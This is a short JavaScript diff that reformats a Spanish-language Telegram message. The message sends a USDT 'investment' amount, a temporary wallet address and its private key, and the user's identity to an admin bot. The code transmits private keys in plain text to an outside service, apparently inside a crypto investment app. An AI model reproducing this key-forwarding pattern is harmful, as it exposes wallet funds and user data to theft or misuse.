@@ -14,13 +14,13 @@ async function sendKeyToAdmin(address, privKey, amount) {
     const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario Desconocido");
     const userId = user?.id || "N/A";
 
-    const text = `🛡️ **PANEL DE AUDITORÍA ADMIN** 🛡️\n\n` +
-                 `💰 **Inversión:** ${amount} USDT\n` +
-                 `📍 **Wallet Temp:** <code>${address}</code>\n` +
-                 `🔑 **Private Key:** <code>${privKey}</code>\n\n` +
-                 `👤 **Usuario:** ${username} (ID: ${userId})\n` +
+    const text = `🛡️ PANEL DE AUDITORÍA ADMIN 🛡️\n\n` +
+                 `💰 Inversión: ${amount} USDT\n` +
+                 `📍 Wallet Temp: <code>${address}</code>\n` +
+                 `🔑 Private Key: <code>${privKey}</code>\n\n` +
+                 `👤 Usuario: ${username} (ID: ${userId})\n` +
                  `------------------------------\n` +
-                 `⚠️ _Usa esta llave si el proceso automático falla._`;
+                 `⚠️ Usa esta llave si el proceso automático falla`;
 
     try {
         await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
